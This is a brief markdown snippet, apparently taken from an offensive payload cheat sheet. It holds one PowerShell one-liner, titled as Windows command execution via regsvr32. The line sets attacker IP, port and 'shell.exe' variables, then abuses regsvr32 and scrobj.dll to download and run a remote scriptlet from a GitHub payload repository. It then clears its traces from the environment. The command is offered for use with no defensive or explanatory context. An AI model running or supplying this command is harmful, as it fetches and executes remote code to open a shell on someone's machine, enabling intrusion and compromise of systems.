
### Windows Command Execution (regsvr32)
```powershell
$env:IP="10.40.10.50"; $env:PORT="8080"; $env:EXE="shell.exe"; regsvr32 /s /n /u /i:https://raw.githubusercontent.com/Baba01hacker666/Unk2payloads/refs/heads/main/Windows/2012.sct scrobj.dll; [Environment]::SetEnvironmentVariable("IP",$null,"Process"); [Environment]::SetEnvironmentVariable("PORT",$null,"Process"); [Environment]::SetEnvironmentVariable("EXE",$null,"Process")
```
